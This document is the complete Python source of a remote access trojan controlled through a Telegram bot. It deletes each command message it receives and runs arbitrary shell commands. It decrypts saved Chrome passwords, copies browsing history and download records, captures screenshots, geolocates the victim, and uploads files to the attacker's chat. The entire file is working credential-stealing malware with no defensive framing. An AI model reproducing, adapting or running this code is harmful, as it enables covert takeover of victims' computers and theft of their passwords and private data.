import os
import time
import json
import shutil
import base64
import sqlite3
import requests
import platform
import subprocess
import win32crypt 
from Cryptodome.Cipher import AES 

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab
        
TOKEN = ''
CHAT_ID = ''
processed_message_ids = []

def execute_command(command):

    if command == 'drives':
        return str([chr(x) + ":" for x in range(65,91) if os.path.exists(chr(x) + ":")])

    elif command == 'location':
        response = requests.get('https://ifconfig.me/ip')
        public_ip = response.text.strip()

        try:
            url = f'http://ip-api.com/json/{public_ip}'
            response = requests.get(url)
            data = response.json()
            country = data.get('country')
            region = data.get('region')
            city = data.get('city')
            lat = data.get('lat')
            lon = data.get('lon')
            timezone = data.get('timezone')
            isp = data.get('isp')

            final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
            return final
        except Exception as e:
            return 'Some shit occured'
    elif command == 'info':
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
        info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        return info_string
    elif command == 'screenshot':
        file_path = "screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            # print(f"Screenshot saved to {file_path}")
            send_file(file_path)
            os.remove(file_path)
            return "Screenshot sent to Telegram."
        except Exception as e:
            return f"Error taking screenshot: {e}"
    elif command == 'help':
        return '''

CMD Commands        | Execute cmd commands directly in bot
drives              | Return All the Drives. Then cd c:/d:/e:
cd foldername       | Change to current folder
download filename   | Download File From Target
screenshot          | Capture Screenshot
info                | Get System Info
location            | Get Target Location
get url             | Download File From URL (provide direct link)
passwd              | Chrome Password List
history             | Chrome Download and History
'''
    elif command.startswith('download '):
        filename = command[
                   9:].strip()
        if os.path.isfile(filename):
            send_file(filename)
            return f"File '{filename}' sent to Telegram."
        else:
            return f"File '{filename}' not found."
    elif command.startswith('get '):
        url = command[4:].strip()
        try:
            download = requests.get(url)
            if download.status_code == 200:
                file_name = url.split('/')[-1]
                with open(file_name, 'wb') as out_file:
                    out_file.write(download.content)
                return f"File downloaded and saved as '{file_name}'."
            else:
                return f"Failed to download file from URL: {url}. Status Code: {download.status_code}"
        except Exception as e:
            return f"Failed to download file from URL: {url}. Error: {str(e)}"
    elif command.startswith('cd '):
        foldername = command[3:].strip()
        try:
            os.chdir(foldername)
            return "Directory Changed To: " + os.getcwd()
        except FileNotFoundError:
            return f"Directory not found: {foldername}"
        except Exception as e:
            return f"Failed to change directory. Error: {str(e)}"
    
    elif command == 'passwd':
        try:
            key = fetching_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","default","Login Data")
            db = sqlite3.connect(db_path) 
            cursor = db.cursor()
            cursor.execute( 
                    "select origin_url, username_value, password_value, date_created from logins "
                    "order by date_last_used") 
            datas = cursor.fetchall()

            for i in range(len(datas)-1, -1, -1):
                with open("password.txt", 'a') as fl:
                    try: fl.write(f"{datas[i][0]} || {datas[i][1]} || {password_decryption(datas[i][2], key)} || {somoy(datas[i][3])}\n")
                    except: fl.write(f"{datas[i][0]} || {datas[i][1]} || {password_decryption(datas[i][2], key)}\n")
            send_file('password.txt')
            os.remove('password.txt')
            return "Password List Send Successful"
        except:
            return "Some error occured When sending the Pass file"

    elif command == 'history':
        try:
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "History")
            con = sqlite3.connect(db_path)

            cursor = con.cursor()
            cursor.execute("SELECT * FROM visited_links")
            tbl = cursor.fetchall()
            for i in range(len(tbl)-1,-1,-1):
                with open("visited_links.txt", 'a') as fl:
                    fl.write(f"{tbl[i][2]}\n")
            cursor.close()

            cursor = con.cursor()
            cursor.execute("SELECT * FROM urls")
            tbl = cursor.fetchall()
            for i in range(len(tbl)-1,-1,-1):
                with open("google_search.txt", 'a') as fl:
                    try:
                        fl.write(f"{tbl[i][0]} - {tbl[i][1]} - {tbl[i][2]} - {somoy(tbl[i][-2])}\n")
                    except:
                        pass
            cursor.close()

            cursor = con.cursor()
            cursor.execute("SELECT * FROM downloads_url_chains")
            tbl = cursor.fetchall()
            for i in range(len(tbl)-1,-1,-1):
                with open("download_links.txt", 'a') as fl:
                    fl.write(f"{tbl[i][-1]}\n")
            cursor.close()

            cursor = con.cursor()
            cursor.execute("SELECT * FROM downloads")
            tbl = cursor.fetchall()
            for i in range(len(tbl)-1,-1,-1):
                with open("download_path.txt", 'a') as fl:
                    fl.write(f"{tbl[i][2]} - {tbl[i][-3]}\n")
            cursor.close()
            con.close()

            send_file('visited_links.txt')
            send_file('google_search.txt')
            send_file('download_links.txt')
            send_file('download_path.txt')
            os.remove('visited_links.txt')
            os.remove('google_search.txt')
            os.remove('download_links.txt')
            os.remove('download_path.txt')
            return "History & Download Lists Send Successful"
        except:
            return "Some error occured When sending the download and History DataFile"

    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8').strip()  
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"


def somoy(tim):
    return time.ctime((tim//1000000000 - 11644452)*1000 + tim//1000000 - (tim//1000000000)*1000)

def fetching_encryption_key(): 
    local_state = os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")
    
    with open(local_state, "r", encoding="utf-8") as f: 
        raw = json.loads(f.read())["os_crypt"]["encrypted_key"]

    key = win32crypt.CryptUnprotectData(base64.b64decode(raw)[5:], None, None, None, 0)[1]
    return key

def password_decryption(password, encryption_key): 
    try: 
        iv = password[3:15] 
        password = password[15:] 
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
        return cipher.decrypt(password)[:-16].decode() 
    except: 
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 
        except: 
            return "No Passwords"

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        return f"Failed to get updates. Status code: {response.status_code}"

def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    response = requests.get(url, params=params)

def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, data=data, files=files)

def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if 'message' in update and 'text' in update['message']:
            message_text = update['message']['text']
            message_id = update['message']['message_id']
            if message_id in processed_message_ids:
                continue
            processed_message_ids.append(message_id)
            delete_message(message_id)
            result = execute_command(message_text)
            if result:
                send_message(result)
        update_id = update['update_id']
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': text
    }
    response = requests.get(url, params=params)


def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_message_ids.clear()
        # else:
        #     print("No updates found.")
        time.sleep(1)

if __name__ == '__main__':
    main()